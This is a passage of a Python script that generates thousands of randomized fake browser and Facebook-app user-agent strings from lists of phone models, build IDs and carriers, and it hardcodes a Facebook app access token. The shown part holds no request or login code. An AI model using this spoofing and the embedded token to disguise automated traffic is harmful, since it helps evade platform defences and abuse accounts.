    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['6002 Build/PPR1.180610.011; wv'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (iPhone;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['CPU iPhone OS 16_0 like Mac OS X)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Infinix X688B'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Series40;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Nokia2000/11.95;'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='S40OviBrowser/2.2.0.0.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 8.1.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['ASUS_Z01QD'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/72.0.3626.76 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['PortalTV'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/85.0.4183.120 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 9;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['PortalTV Build/PKQ1.190408.001; wv'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 5.1;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['GT-810 Build/LMY47I'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/66.0.3359.106 Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; U; Android 2.2;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Desire_A8181 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' 4.0 Mobile Safari/533.1'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (SMART-TV;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='Linux; Tizen 2.4.0)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/538.1'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; U; Android 2.3.6;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; GT-S5839i Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=' GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='4.0 Mobile Safari/534.30'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 4.0.4;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='LT30p Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='7.0.A.3.195) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='18.0.1025.166 Mobile Safari/535.19'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['CPH1969 Build/RP1A.200720.011; wv)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Versi/4.0 Chrome/105.0.5195.136 Seluler Safari/537.36 WpsMoffice/16.6/arm64-v8a/1347'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)

    aa='Mozilla/5.0 (Linux; Android 7.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 4 Build/NRD90M)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/63.0.3239.111 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 9 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 9 Pro)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['ASUS_I005DA)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/102.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Vivo Y91C)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/98.0.4711.185 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['M2012K11AG Build/'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 WpsMoffice/16.3.2/arm64-v8a/1328'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 11;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Vivo Y91C)'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/97.0.4740.200 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 8.1.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['CPH1909 Build/O11019 )'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='JioBrowser/1.4.7 Chrome/69.0.3497.100 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    devua.append(uaku2)


devapi=[]
for ksh in range(5000):
    samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
    fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
    fbbv = str(random.randint(000000000,999999999))
    fbrv = str(random.randint(000000000,999999999))
    accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
    fbsv = str(random.randint(4,13))+'.0'
    model,build = random.choice(samsung).split('|')
    fbmf = 'samsung'
    fbbd = 'samsung'
    en = random.choice(['en_US','en_GB'])
    cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
    network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
    ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/335.0.0.28.118;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/316527966;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBDV/Redmi Note 8 Pro;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=1080,height=2220};FB_FW/1;FBRV/317757053;]"
    devapi.append(ua)
for khd in range(5000):
    VAPP = random.randint(410000000,499999999)
    fbs = random.choice([
        'com.facebook.adsmanager',
        'com.facebook.lite',
        'com.facebook.orca',
        'com.facebook.katana',
        'com.facebook.mlite'])
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    gt=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 